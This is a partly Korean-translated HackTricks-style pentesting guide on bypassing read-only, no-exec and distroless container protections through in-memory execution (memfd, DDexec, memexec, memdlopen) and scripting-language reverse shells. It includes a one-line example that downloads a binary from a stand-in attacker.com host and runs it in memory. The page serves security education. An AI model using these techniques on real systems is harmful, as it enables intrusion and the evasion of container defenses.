# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## 비디오

In the following videos you can find the techniques mentioned in this page explained more in depth:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

컨테이너에서 특히 read-only (ro) file system protection으로 마운트된 linux 시스템을 찾는 경우가 점점 많아지고 있습니다. 이는 컨테이너를 ro 파일 시스템으로 실행하는 것이 `securitycontext`에 **`readOnlyRootFilesystem: true`**를 설정하는 것만큼 쉽기 때문입니다:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

하지만 파일 시스템이 ro로 마운트되었더라도 **`/dev/shm`**는 여전히 쓰기 가능하기 때문에 디스크에 아무 것도 쓸 수 없다는 것은 사실이 아닙니다. 다만 이 폴더는 **mounted with no-exec protection**으로 설정되므로, 여기에 바이너리를 다운로드하더라도 **실행할 수 없습니다**.

> [!WARNING]
> red team 관점에서는, 이는 시스템에 아직 없는 바이너리(예: backdoors 또는 enumerators인 `kubectl`)를 다운로드하고 실행하는 작업을 **복잡하게 만듭니다**.

## Easiest bypass: Scripts

바이너리를 언급했지만, 인터프리터가 시스템에 존재한다면 **어떠한 스크립트든 실행할 수 있습니다**. 예를 들어 `sh`가 있으면 **shell script**, `python`이 설치되어 있으면 **python script**를 실행할 수 있습니다.

하지만 이것만으로는 바이너리 backdoor나 실행해야 할 다른 바이너리 도구를 실행하기에 충분하지 않습니다.

## Memory Bypasses

파일 시스템이 바이너리 실행을 허용하지 않는다면, 가장 좋은 방법은 **메모리에서 실행하는 것**입니다. 이러한 보호는 메모리에는 적용되지 않습니다.

### FD + exec syscall bypass

머신 내부에 **Python**, **Perl**, **Ruby** 같은 강력한 스크립트 엔진이 있다면, 바이너리를 메모리에서 실행하기 위해 다운로드한 뒤, 메모리 파일 디스크립터(`create_memfd` syscall)에 저장할 수 있습니다. 이 메모리 fd는 해당 보호의 영향을 받지 않으며, 그 다음 **`exec` syscall**을 호출하여 **fd를 실행할 파일로 지정**하면 됩니다.

이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트를 쉽게 사용할 수 있습니다. 바이너리를 전달하면 지정한 언어의 스크립트를 생성해 주는데, 그 스크립트는 **binary를 압축하고 b64로 인코딩**한 형태로 포함되며 `create_memfd` syscall로 생성한 **fd**에 **디코드하고 압축을 해제**하는 지침과, 이를 실행하기 위한 **exec syscall** 호출을 포함합니다.

> [!WARNING]
> PHP나 Node 같은 다른 스크립팅 언어에서는 작동하지 않습니다. 이들은 스크립트에서 raw syscalls를 호출하는 기본적인 방법이 없기 때문에 `create_memfd`를 호출해 바이너리를 저장할 **memory fd**를 만들 수 없습니다.
>
> 또한 `/dev/shm`에 파일을 만들어 일반 fd를 생성하는 것은 작동하지 않습니다. no-exec protection이 적용되어 실행이 허용되지 않습니다.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 는 **`/proc/self/mem`**을 덮어써서 자신의 프로세스 메모리를 수정할 수 있게 해주는 기술입니다.

따라서 프로세스가 실행하는 어셈블리 코드를 제어함으로써, **shellcode**를 작성하고 프로세스를 "변형"시켜 **임의의 코드를 실행**할 수 있습니다.

> [!TIP]
> **DDexec / EverythingExec**를 사용하면 자신의 **shellcode** 또는 어떤 **binary**든 **메모리에서** 로드하여 **실행**할 수 있습니다.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.

You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.

The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.

### Reverse Shell

In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
